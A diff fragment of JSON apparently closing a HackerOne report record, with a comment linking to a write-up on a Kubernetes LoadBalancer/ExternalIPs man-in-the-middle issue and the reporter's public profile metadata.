+      "content": "Write up available at https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/",
+      "user": {
+        "id": 700624,
+        "username": "champtar",
+        "name": "Etienne Champetier",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2019-08-07T07:30:17.243Z",
+        "url": "https://hackerone.com/champtar",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
